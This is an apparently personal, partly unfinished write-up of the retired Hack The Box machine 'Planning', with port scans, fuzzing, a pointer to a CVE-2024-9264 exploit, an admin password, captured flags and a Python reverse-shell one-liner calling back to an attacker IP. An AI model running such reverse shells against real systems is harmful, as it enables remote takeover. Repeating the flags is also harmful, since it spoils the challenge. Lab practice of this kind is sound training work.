---
file_created: 06 Sep 2025 17:31
title: Planning
difficulty: Easy
difficult_sort: 1
points: 30
os: Linux
target_ip: 10.10.11.68
platform: Hack The Box
category: B2R
box_status: Retired
url: https://app.hackthebox.com/machines/Planning
user_flag: true
root_flag: true
completed: false
date_finish:
tags: htb/machines
---
# Resolution summary
![500x200](<./attachments/Planning-10.png>)

>[!summary]
>- Step 1
>- Step 2

![](<./attachments/Planning-2.png>)
>admin:0D5oT70Fq13EvB5r
## Tutorial
- [medium](https://medium.com/@ahmedshaban7000/htb-planning-write-up-c154b9577698)
- [mateogal.com](https://mateogal.com/posts/planning/)
## Improved skills
- Skill 1
- Skill 2
## Used tools
- nmap
- gobuster
---
# Information Gathering

## Scanned all TCP ports:
- `export IP="10.10.11.68"`
```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

## Enumerated open TCP ports:

```bash
nmap -Pn -p 22,80 $IP -sCTV -vv -oN scans/nmap-open.txt

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Edukate - Online Education Website
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration
## Port 80 - HTTP (Apache)
- needs to redirect to `http://planning.htb/`
- http-server-header: `nginx/1.24.0 (Ubuntu)`
```sh
echo "$IP planning.htb" | sudo tee -a /etc/hosts
```

![](<./attachments/Planning-1.png>)
```sh
ffuf -u http://planning.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -t 50
```
- sub-directory enumeration
```sh

```
![](<./attachments/Planning-3.png>)

---
# Exploitation
- CVE-2024-9264 [repo](https://github-com.translate.goog/z3k0sec/CVE-2024-9264-RCE-Exploit?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en)
```
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
```
## SQL Injection
![](<./attachments/Planning-4.png>)

```python
python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.80',9443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```
![](<./attachments/Planning-9.png>)


# Lateral Movement to xxx

## Local enumeration
![](<./attachments/Planning-5.png>)

![](<./attachments/Planning-6.png>)
## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy

## User Flag
```txt
d674747b772c8d92405db80078d985af
```
## Root Flag
```txt
0690a9884b5a422f0388d1b0ababc058
```
## **/etc/shadow**

```bash

```

---
# Proof
![](<./attachments/Planning-8.png>)
